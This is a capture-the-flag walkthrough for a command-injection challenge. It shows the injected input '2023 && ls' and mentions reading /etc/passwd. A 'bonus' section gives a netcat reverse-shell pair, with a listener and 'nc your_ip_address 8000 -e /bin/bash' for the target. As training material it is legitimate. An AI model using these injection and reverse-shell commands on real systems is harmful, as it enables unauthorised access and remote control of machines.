# Mission 7

You only need to have some Linux basic command knowledge to crack this.

<details>
  <summary> Reveal Hint </summary>
  
  **Hint:** What you have to use is command injection method.
  
</details>

---

<details>
  <summary> Reveal Answer </summary>
  
  **Answer:** When you type in '2023', what happens behind the scene is that the underlying Linux system runs 'cal 2023' command, dump the output to cal.pl file, and redirect u to that file. Since it does not do any form of input sanitization, the command is directly executed. Therefore, if you type in '2023 && ls', the linux system will dump the output of 'cal' command and 'ls' command into cal.pl file. And, you will see the name of password file in that cal.pl file.

  **Note:** The truth is this form actually does some kinda filtering to only allow 'ls' command. Therefore, you will not see any output if you try other commands like 'whoami' or 'cat /etc/passwd'.
  
</details>

---

<details>
  <summary>Reveal Bonus Knowledge</summary>

  **Bonus Knowledge:** In real world situations, if you can perform command injection, you might be able to use other commands or make a reverse shell connection back to yourself. For example, run 'nc -nvlp 8000' on your PC and 'nc your_ip_address 8000 -e /bin/bash' on the target.

</details>

[<< Previous](../Mission%206/) &nbsp;&nbsp;|&nbsp;&nbsp; [Next >>](../Mission%208/)
